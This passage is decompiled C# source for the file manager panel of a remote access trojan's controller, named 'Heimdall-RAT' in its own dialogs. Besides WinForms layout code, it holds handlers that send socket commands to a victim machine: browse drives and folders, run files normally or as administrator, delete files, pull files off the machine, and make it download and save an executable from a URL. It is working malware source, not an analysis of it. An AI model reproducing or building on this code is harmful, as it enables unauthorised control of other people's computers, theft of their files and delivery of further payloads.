		val5.set_ImageIndex(8);
		val5.set_Name("Node16");
		val5.set_SelectedImageIndex(8);
		val5.set_Text("Pictures");
		val6.set_ImageIndex(1);
		val6.set_Name("Node17");
		val6.set_SelectedImageIndex(1);
		val6.set_Text("Startup");
		val7.set_ImageIndex(1);
		val7.set_Name("Node18");
		val7.set_SelectedImageIndex(1);
		val7.set_Text("AppData");
		val8.set_ImageIndex(3);
		val8.set_Name("Node19");
		val8.set_SelectedImageIndex(3);
		val8.set_Text("Temp");
		val9.set_ImageIndex(7);
		val9.set_Name("Node0");
		val9.set_SelectedImageIndex(7);
		val9.set_Text("Quick Access");
		val10.set_ImageIndex(6);
		val10.set_Name("Node1");
		val10.set_SelectedImageIndex(6);
		val10.set_Text("My Computer");
		quikacc.get_Nodes().AddRange((TreeNode[])(object)new TreeNode[2] { val9, val10 });
		quikacc.set_SelectedImageIndex(0);
		TreeView obj4 = quikacc;
		size = new Size(200, 334);
		((Control)obj4).set_Size(size);
		((Control)quikacc).set_TabIndex(1);
		((Control)Panel1).get_Controls().Add((Control)(object)pathRefr);
		((Control)Panel1).get_Controls().Add((Control)(object)LocatPath);
		((Control)Panel1).get_Controls().Add((Control)(object)pathEntr);
		((Control)Panel1).set_Dock((DockStyle)1);
		Panel panel5 = Panel1;
		location = new Point(3, 3);
		((Control)panel5).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel6 = Panel1;
		size = new Size(688, 38);
		((Control)panel6).set_Size(size);
		((Control)Panel1).set_TabIndex(0);
		((Control)pathRefr).set_Anchor((AnchorStyles)11);
		((ButtonBase)pathRefr).set_Image((Image)(object)Resources._1487352127_old_view_refresh);
		Button obj5 = pathRefr;
		location = new Point(649, 5);
		((Control)obj5).set_Location(location);
		((Control)pathRefr).set_Name("pathRefr");
		Button obj6 = pathRefr;
		size = new Size(31, 28);
		((Control)obj6).set_Size(size);
		((Control)pathRefr).set_TabIndex(5);
		((ButtonBase)pathRefr).set_UseVisualStyleBackColor(true);
		((Control)LocatPath).set_Anchor((AnchorStyles)15);
		TextBox locatPath = LocatPath;
		location = new Point(10, 9);
		((Control)locatPath).set_Location(location);
		((Control)LocatPath).set_Name("LocatPath");
		TextBox locatPath2 = LocatPath;
		size = new Size(598, 20);
		((Control)locatPath2).set_Size(size);
		((Control)LocatPath).set_TabIndex(3);
		((Control)pathEntr).set_Anchor((AnchorStyles)11);
		((ButtonBase)pathEntr).set_Image((Image)(object)Resources._1487352050_next);
		Button obj7 = pathEntr;
		location = new Point(614, 5);
		((Control)obj7).set_Location(location);
		((Control)pathEntr).set_Name("pathEntr");
		Button obj8 = pathEntr;
		size = new Size(33, 28);
		((Control)obj8).set_Size(size);
		((Control)pathEntr).set_TabIndex(4);
		((ButtonBase)pathEntr).set_UseVisualStyleBackColor(true);
		((Control)TabPage2).get_Controls().Add((Control)(object)Panel7);
		((Control)TabPage2).get_Controls().Add((Control)(object)Panel6);
		((Control)TabPage2).get_Controls().Add((Control)(object)StatusStrip2);
		TabPage tabPage4 = TabPage2;
		location = new Point(154, 4);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(694, 378);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("Search File");
		TabPage2.set_UseVisualStyleBackColor(true);
		((Control)Panel7).get_Controls().Add((Control)(object)listSearchFiles);
		((Control)Panel7).set_Dock((DockStyle)5);
		Panel panel7 = Panel7;
		location = new Point(3, 65);
		((Control)panel7).set_Location(location);
		((Control)Panel7).set_Name("Panel7");
		Panel panel8 = Panel7;
		size = new Size(688, 288);
		((Control)panel8).set_Size(size);
		((Control)Panel7).set_TabIndex(8);
		listSearchFiles.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader12, ColumnHeader13 });
		((Control)listSearchFiles).set_ContextMenuStrip(ContextMenuStrip3);
		((Control)listSearchFiles).set_Dock((DockStyle)5);
		((Control)listSearchFiles).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		listSearchFiles.set_FullRowSelect(true);
		listSearchFiles.set_GridLines(true);
		listSearchFiles.set_LargeImageList(ImageList3);
		ListView obj9 = listSearchFiles;
		location = new Point(0, 0);
		((Control)obj9).set_Location(location);
		((Control)listSearchFiles).set_Name("listSearchFiles");
		ListView obj10 = listSearchFiles;
		size = new Size(688, 288);
		((Control)obj10).set_Size(size);
		listSearchFiles.set_SmallImageList(ImageList3);
		((Control)listSearchFiles).set_TabIndex(6);
		listSearchFiles.set_UseCompatibleStateImageBehavior(false);
		listSearchFiles.set_View((View)1);
		ColumnHeader12.set_Text("File Path");
		ColumnHeader12.set_Width(598);
		ColumnHeader13.set_Text("Size");
		ColumnHeader13.set_Width(84);
		((Control)Panel6).get_Controls().Add((Control)(object)StopSearc);
		((Control)Panel6).get_Controls().Add((Control)(object)SearchPath);
		((Control)Panel6).get_Controls().Add((Control)(object)Label1);
		((Control)Panel6).get_Controls().Add((Control)(object)Label2);
		((Control)Panel6).get_Controls().Add((Control)(object)StartSearc);
		((Control)Panel6).get_Controls().Add((Control)(object)SearcFileName);
		((Control)Panel6).set_Dock((DockStyle)1);
		Panel panel9 = Panel6;
		location = new Point(3, 3);
		((Control)panel9).set_Location(location);
		((Control)Panel6).set_Name("Panel6");
		Panel panel10 = Panel6;
		size = new Size(688, 62);
		((Control)panel10).set_Size(size);
		((Control)Panel6).set_TabIndex(7);
		((Control)StopSearc).set_Anchor((AnchorStyles)10);
		((ButtonBase)StopSearc).set_Image((Image)(object)Resources._1484710739_InterfaceExpendet_08);
		Button stopSearc = StopSearc;
		location = new Point(647, 32);
		((Control)stopSearc).set_Location(location);
		((Control)StopSearc).set_Name("StopSearc");
		Button stopSearc2 = StopSearc;
		size = new Size(34, 26);
		((Control)stopSearc2).set_Size(size);
		((Control)StopSearc).set_TabIndex(8);
		((ButtonBase)StopSearc).set_UseVisualStyleBackColor(true);
		((Control)SearchPath).set_Anchor((AnchorStyles)13);
		((Control)SearchPath).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox searchPath = SearchPath;
		location = new Point(103, 8);
		((Control)searchPath).set_Location(location);
		((Control)SearchPath).set_Name("SearchPath");
		TextBox searchPath2 = SearchPath;
		size = new Size(541, 21);
		((Control)searchPath2).set_Size(size);
		((Control)SearchPath).set_TabIndex(2);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(9, 11);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(85, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Search Path :");
		((Control)Label2).set_Anchor((AnchorStyles)6);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label2;
		location = new Point(8, 36);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(93, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Search Name :");
		((Control)StartSearc).set_Anchor((AnchorStyles)9);
		((ButtonBase)StartSearc).set_Image((Image)(object)Resources._1484710348_system_search);
		Button startSearc = StartSearc;
		location = new Point(647, 4);
		((Control)startSearc).set_Location(location);
		((Control)StartSearc).set_Name("StartSearc");
		Button startSearc2 = StartSearc;
		size = new Size(34, 26);
		((Control)startSearc2).set_Size(size);
		((Control)StartSearc).set_TabIndex(4);
		((ButtonBase)StartSearc).set_UseVisualStyleBackColor(true);
		((Control)SearcFileName).set_Anchor((AnchorStyles)14);
		((Control)SearcFileName).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox searcFileName = SearcFileName;
		location = new Point(103, 33);
		((Control)searcFileName).set_Location(location);
		((Control)SearcFileName).set_Name("SearcFileName");
		TextBox searcFileName2 = SearcFileName;
		size = new Size(541, 21);
		((Control)searcFileName2).set_Size(size);
		((Control)SearcFileName).set_TabIndex(3);
		SearcFileName.set_Text("*.exe");
		((ToolStrip)StatusStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ToolStripStatusLabel8,
			(ToolStripItem)ToolStripStatusLabel5
		});
		StatusStrip statusStrip3 = StatusStrip2;
		location = new Point(3, 353);
		((Control)statusStrip3).set_Location(location);
		((Control)StatusStrip2).set_Name("StatusStrip2");
		StatusStrip statusStrip4 = StatusStrip2;
		size = new Size(688, 22);
		((Control)statusStrip4).set_Size(size);
		((Control)StatusStrip2).set_TabIndex(6);
		((Control)StatusStrip2).set_Text("StatusStrip2");
		((ToolStripItem)ToolStripStatusLabel8).set_Name("ToolStripStatusLabel8");
		ToolStripStatusLabel toolStripStatusLabel5 = ToolStripStatusLabel8;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel5).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel5).set_Name("ToolStripStatusLabel5");
		ToolStripStatusLabel toolStripStatusLabel6 = ToolStripStatusLabel5;
		size = new Size(17, 17);
		((ToolStripItem)toolStripStatusLabel6).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel5).set_Text("--");
		((Control)TabPage3).get_Controls().Add((Control)(object)listThumb);
		((Control)TabPage3).get_Controls().Add((Control)(object)StatusStrip3);
		TabPage tabPage7 = TabPage3;
		location = new Point(154, 4);
		tabPage7.set_Location(location);
		((Control)TabPage3).set_Name("TabPage3");
		TabPage tabPage8 = TabPage3;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage8).set_Padding(padding);
		TabPage tabPage9 = TabPage3;
		size = new Size(694, 378);
		((Control)tabPage9).set_Size(size);
		TabPage3.set_TabIndex(2);
		TabPage3.set_Text("Thumbnails");
		TabPage3.set_UseVisualStyleBackColor(true);
		((Control)listThumb).set_Dock((DockStyle)5);
		listThumb.set_LargeImageList(ImageList4);
		ListView obj11 = listThumb;
		location = new Point(3, 3);
		((Control)obj11).set_Location(location);
		((Control)listThumb).set_Name("listThumb");
		ListView obj12 = listThumb;
		size = new Size(688, 350);
		((Control)obj12).set_Size(size);
		listThumb.set_SmallImageList(ImageList4);
		((Control)listThumb).set_TabIndex(1);
		listThumb.set_UseCompatibleStateImageBehavior(false);
		((ToolStrip)StatusStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel6 });
		StatusStrip statusStrip5 = StatusStrip3;
		location = new Point(3, 353);
		((Control)statusStrip5).set_Location(location);
		((Control)StatusStrip3).set_Name("StatusStrip3");
		StatusStrip statusStrip6 = StatusStrip3;
		size = new Size(688, 22);
		((Control)statusStrip6).set_Size(size);
		((Control)StatusStrip3).set_TabIndex(0);
		((Control)StatusStrip3).set_Text("StatusStrip3");
		((ToolStripItem)ToolStripStatusLabel6).set_Name("ToolStripStatusLabel6");
		ToolStripStatusLabel toolStripStatusLabel7 = ToolStripStatusLabel6;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel7).set_Size(size);
		((Control)TabPage4).get_Controls().Add((Control)(object)listDownloads);
		TabPage tabPage10 = TabPage4;
		location = new Point(154, 4);
		tabPage10.set_Location(location);
		((Control)TabPage4).set_Name("TabPage4");
		TabPage tabPage11 = TabPage4;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage11).set_Padding(padding);
		TabPage tabPage12 = TabPage4;
		size = new Size(694, 378);
		((Control)tabPage12).set_Size(size);
		TabPage4.set_TabIndex(3);
		TabPage4.set_Text("Transfer File");
		TabPage4.set_UseVisualStyleBackColor(true);
		listDownloads.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[5] { ColumnHeader1, ColumnHeader2, ColumnHeader3, ColumnHeader4, ColumnHeader5 });
		((Control)listDownloads).set_ContextMenuStrip(ContextMenuStrip2);
		((Control)listDownloads).set_Dock((DockStyle)5);
		((Control)listDownloads).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		listDownloads.set_FullRowSelect(true);
		listDownloads.set_GridLines(true);
		listDownloads.set_LargeImageList(ImageList3);
		ListView obj13 = listDownloads;
		location = new Point(3, 3);
		((Control)obj13).set_Location(location);
		((Control)listDownloads).set_Name("listDownloads");
		listDownloads.set_ShowItemToolTips(true);
		ListView obj14 = listDownloads;
		size = new Size(688, 372);
		((Control)obj14).set_Size(size);
		listDownloads.set_SmallImageList(ImageList3);
		((Control)listDownloads).set_TabIndex(0);
		((Control)listDownloads).set_Tag((object)"");
		listDownloads.set_UseCompatibleStateImageBehavior(false);
		listDownloads.set_View((View)1);
		ColumnHeader1.set_Text("Name");
		ColumnHeader1.set_Width(383);
		ColumnHeader2.set_Text("File Size");
		ColumnHeader2.set_Width(67);
		ColumnHeader3.set_Text("File Type");
		ColumnHeader3.set_Width(85);
		ColumnHeader4.set_Text("Progress");
		ColumnHeader4.set_Width(79);
		ColumnHeader5.set_Text("Status");
		((Control)TabPage6).get_Controls().Add((Control)(object)Panel5);
		((Control)TabPage6).get_Controls().Add((Control)(object)Panel4);
		((Control)TabPage6).get_Controls().Add((Control)(object)StatusStrip4);
		TabPage tabPage13 = TabPage6;
		location = new Point(154, 4);
		tabPage13.set_Location(location);
		((Control)TabPage6).set_Name("TabPage6");
		TabPage tabPage14 = TabPage6;
		size = new Size(694, 378);
		((Control)tabPage14).set_Size(size);
		TabPage6.set_TabIndex(5);
		TabPage6.set_Text("Read Text file");
		TabPage6.set_UseVisualStyleBackColor(true);
		((Control)Panel5).get_Controls().Add((Control)(object)txtbRat);
		((Control)Panel5).set_Dock((DockStyle)5);
		Panel panel11 = Panel5;
		location = new Point(0, 36);
		((Control)panel11).set_Location(location);
		((Control)Panel5).set_Name("Panel5");
		Panel panel12 = Panel5;
		size = new Size(694, 320);
		((Control)panel12).set_Size(size);
		((Control)Panel5).set_TabIndex(2);
		((Control)txtbRat).set_Anchor((AnchorStyles)15);
		((TextBoxBase)txtbRat).set_BackColor(Color.White);
		((Control)txtbRat).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj15 = txtbRat;
		location = new Point(11, 11);
		((Control)obj15).set_Location(location);
		txtbRat.set_Multiline(true);
		((Control)txtbRat).set_Name("txtbRat");
		txtbRat.set_ScrollBars((ScrollBars)3);
		TextBox obj16 = txtbRat;
		size = new Size(675, 301);
		((Control)obj16).set_Size(size);
		((Control)txtbRat).set_TabIndex(0);
		((Control)Panel4).get_Controls().Add((Control)(object)Label3);
		((Control)Panel4).get_Controls().Add((Control)(object)redSave);
		((Control)Panel4).get_Controls().Add((Control)(object)reTextPath);
		((Control)Panel4).get_Controls().Add((Control)(object)readGo);
		((Control)Panel4).set_Dock((DockStyle)1);
		Panel panel13 = Panel4;
		location = new Point(0, 0);
		((Control)panel13).set_Location(location);
		((Control)Panel4).set_Name("Panel4");
		Panel panel14 = Panel4;
		size = new Size(694, 36);
		((Control)panel14).set_Size(size);
		((Control)Panel4).set_TabIndex(1);
		((Control)Label3).set_Anchor((AnchorStyles)7);
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(8, 11);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(54, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(1);
		Label3.set_Text("File Path :");
		((Control)redSave).set_Anchor((AnchorStyles)11);
		((ButtonBase)redSave).set_Image((Image)(object)Resources._1484482355_floppy_disk_save);
		Button obj17 = redSave;
		location = new Point(652, 5);
		((Control)obj17).set_Location(location);
		((Control)redSave).set_Name("redSave");
		Button obj18 = redSave;
		size = new Size(34, 24);
		((Control)obj18).set_Size(size);
		((Control)redSave).set_TabIndex(3);
		((ButtonBase)redSave).set_UseVisualStyleBackColor(true);
		((Control)reTextPath).set_Anchor((AnchorStyles)15);
		TextBox obj19 = reTextPath;
		location = new Point(64, 8);
		((Control)obj19).set_Location(location);
		((Control)reTextPath).set_Name("reTextPath");
		TextBox obj20 = reTextPath;
		size = new Size(545, 20);
		((Control)obj20).set_Size(size);
		((Control)reTextPath).set_TabIndex(0);
		((Control)readGo).set_Anchor((AnchorStyles)11);
		((ButtonBase)readGo).set_Image((Image)(object)Resources._1484482336_next_go_point_pointer_direction);
		Button obj21 = readGo;
		location = new Point(615, 5);
		((Control)obj21).set_Location(location);
		((Control)readGo).set_Name("readGo");
		Button obj22 = readGo;
		size = new Size(34, 24);
		((Control)obj22).set_Size(size);
		((Control)readGo).set_TabIndex(2);
		((ButtonBase)readGo).set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip4).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel7 });
		StatusStrip statusStrip7 = StatusStrip4;
		location = new Point(0, 356);
		((Control)statusStrip7).set_Location(location);
		((Control)StatusStrip4).set_Name("StatusStrip4");
		StatusStrip statusStrip8 = StatusStrip4;
		size = new Size(694, 22);
		((Control)statusStrip8).set_Size(size);
		((Control)StatusStrip4).set_TabIndex(0);
		((Control)StatusStrip4).set_Text("StatusStrip4");
		((ToolStripItem)ToolStripStatusLabel7).set_Name("ToolStripStatusLabel7");
		ToolStripStatusLabel toolStripStatusLabel8 = ToolStripStatusLabel7;
		size = new Size(17, 17);
		((ToolStripItem)toolStripStatusLabel8).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel7).set_Text("--");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(852, 386);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)EtherealTabControl1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("FMGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("  ");
		((Control)ContextMenuStrip1).ResumeLayout(false);
		((Control)ContextMenuStrip3).ResumeLayout(false);
		((Control)ContextMenuStrip2).ResumeLayout(false);
		((Control)EtherealTabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)TabPage2).ResumeLayout(false);
		((Control)TabPage2).PerformLayout();
		((Control)Panel7).ResumeLayout(false);
		((Control)Panel6).ResumeLayout(false);
		((Control)Panel6).PerformLayout();
		((Control)StatusStrip2).ResumeLayout(false);
		((Control)StatusStrip2).PerformLayout();
		((Control)TabPage3).ResumeLayout(false);
		((Control)TabPage3).PerformLayout();
		((Control)StatusStrip3).ResumeLayout(false);
		((Control)StatusStrip3).PerformLayout();
		((Control)TabPage4).ResumeLayout(false);
		((Control)TabPage6).ResumeLayout(false);
		((Control)TabPage6).PerformLayout();
		((Control)Panel5).ResumeLayout(false);
		((Control)Panel5).PerformLayout();
		((Control)Panel4).ResumeLayout(false);
		((Control)Panel4).PerformLayout();
		((Control)StatusStrip4).ResumeLayout(false);
		((Control)StatusStrip4).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public void CDIS()
	{
		listFiles.get_Items().Clear();
		((Control)listFiles).set_Enabled(false);
		((Control)quikacc).set_Enabled(false);
		((Control)LocatPath).set_Enabled(false);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Please wait a moment ...");
	}

	public void ENPATH()
	{
		try
		{
			if (LocatPath.get_Text().Length > 3)
			{
				listFiles.get_Items().Add("...", 0);
				BackToolStripMenuItem.set_Enabled(true);
			}
			else
			{
				BackToolStripMenuItem.set_Enabled(false);
			}
			((Control)LocatPath).set_Enabled(false);
			MyProject.Forms.FrmMAINGR.s.Send(sock, "GetFiles-Directorys" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text()));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (LocatPath.get_Text().Length > 0)
		{
			listFiles.get_Items().Clear();
			REFLI();
		}
	}

	public void REFLI()
	{
		if (LocatPath.get_Text().Length > 3)
		{
			listFiles.get_Items().Add("...", 0);
			BackToolStripMenuItem.set_Enabled(true);
		}
		else
		{
			BackToolStripMenuItem.set_Enabled(false);
		}
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetFiles-Directorys" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text()));
		((Control)listFiles).set_Enabled(false);
		((Control)quikacc).set_Enabled(false);
		((Control)pathEntr).set_Enabled(false);
		((Control)pathRefr).set_Enabled(false);
		((Control)LocatPath).set_Enabled(false);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Please wait a moment ...");
	}

	private void Pathloc_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		if (LocatPath.get_Text().Length <= 0)
		{
			return;
		}
		if ((int)e.get_KeyCode() == 13)
		{
			if (LocatPath.get_Multiline())
			{
				LocatPath.set_Multiline(false);
			}
			if (!LocatPath.get_Text().EndsWith("\\"))
			{
				LocatPath.set_Text(LocatPath.get_Text() + "\\");
			}
			CDIS();
			ENPATH();
		}
		if (!LocatPath.get_Multiline())
		{
			LocatPath.set_Multiline(true);
		}
	}

	public void RetPa()
	{
		if (LocatPath.get_Text().Length == 3)
		{
			LocatPath.set_Text("");
			listFiles.get_Items().Clear();
		}
		else if (LocatPath.get_Text().Length > 3)
		{
			LocatPath.set_Text(LocatPath.get_Text().Substring(0, LocatPath.get_Text().LastIndexOf("\\")));
			LocatPath.set_Text(LocatPath.get_Text().Substring(0, checked(LocatPath.get_Text().LastIndexOf("\\") + 1)));
			listFiles.get_Items().Clear();
			REFLI();
		}
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		listFiles.get_Items().Clear();
		REFLI();
	}

	private void BackToolStripMenuItem_Click(object sender, EventArgs e)
	{
		RetPa();
	}

	private void FileManager_Load(object sender, EventArgs e)
	{
		quikacc.get_Nodes().get_Item(0).ExpandAll();
		quikacc.get_Nodes().get_Item(1).ExpandAll();
		MyProject.Forms.FrmMAINGR.s.Send(sock, "GetDrives");
	}

	private void AsAdministratorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Execute" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + "Admin");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(val.get_SubItems().get_Item(0).get_Text(), "...", false) != 0)
					{
						if (val.get_ImageIndex() == 0)
						{
							MyProject.Forms.FrmMAINGR.s.Send(sock, "Delete" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + "Folder");
						}
						else
						{
							MyProject.Forms.FrmMAINGR.s.Send(sock, "Delete" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + "File");
						}
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DownloadViaUrlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		OPD = true;
		if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("FDUR") != null)
		{
			return;
		}
		string text = Interaction.InputBox("Enter your link!", "Heimdall-RAT ", "www.site.com/file.exe", -1, -1);
		if (Operators.CompareString(text, "", false) > 0)
		{
			string text2 = Interaction.InputBox("Enter your file name!", "Heimdall-RAT ", "file.exe", -1, -1);
			if (Operators.CompareString(text2, "", false) > 0)
			{
				MyProject.Forms.FrmMAINGR.s.Send(sock, "DFVURL" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(text) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + text2));
			}
		}
	}

	private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (val.get_ImageIndex() != 0)
					{
						MyProject.Forms.FrmMAINGR.s.Send(sock, "Download" + MyProject.Forms.FrmMAINGR.Key + "DW" + MyProject.Forms.FrmMAINGR.Key + "DW" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void NormalToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listFiles.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Execute" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(LocatPath.get_Text() + val.get_SubItems().get_Item(0).get_Text()) + MyProject.Forms.FrmMAINGR.Key + "Normal");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OpenDownloadFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Process.Start(Path);
	}

	private void SuspendToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listDownloads.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if ((Operators.CompareString(val.get_SubItems().get_Item(4).get_Text()
						.ToString(), "Downloading", false) == 0) | (Operators.CompareString(val.get_SubItems().get_Item(4).get_Text()
						.ToString(), "Waiting", false) == 0))
					{
						MyProject.Forms.FrmMAINGR.s.Send(Conversions.ToInteger(val.get_ToolTipText()), "Pause");
						val.get_SubItems().get_Item(4).set_Text("Suspend");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void StopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listDownloads.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if ((Operators.CompareString(val.get_SubItems().get_Item(4).get_Text(), "Downloading", false) == 0) | (Operators.CompareString(val.get_SubItems().get_Item(4).get_Text(), "Waiting", false) == 0))
					{
						MyProject.Forms.FrmMAINGR.s.Send(Conversions.ToInteger(val.get_ToolTipText()), "Abort");
						val.get_SubItems().get_Item(4).set_Text("Stopped");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
